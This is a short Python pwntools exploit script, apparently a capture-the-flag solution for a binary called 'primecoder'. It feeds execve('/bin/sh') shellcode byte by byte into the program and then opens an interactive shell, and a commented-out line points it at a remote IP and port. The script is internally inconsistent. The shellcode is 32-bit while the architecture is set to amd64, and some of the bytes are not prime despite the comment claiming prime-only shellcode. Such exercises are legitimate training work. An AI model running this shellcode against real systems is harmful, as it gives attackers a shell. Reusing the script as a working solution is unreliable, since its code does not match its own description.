#!/usr/bin/python

from pwn import *

context.arch = "amd64"
r = process("./primecoder")
# r = remote("124.16.75.117", 51001)
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
for i in range(len(shellcode)):
    if i == 0:
        print(r.sendafter(b"buffer", str(shellcode[i]) + "\n"))
    else:
        print(r.sendafter(b"prime", str(shellcode[i]) + "\n"))
r.interactive()
# 纯素数构造shellcode
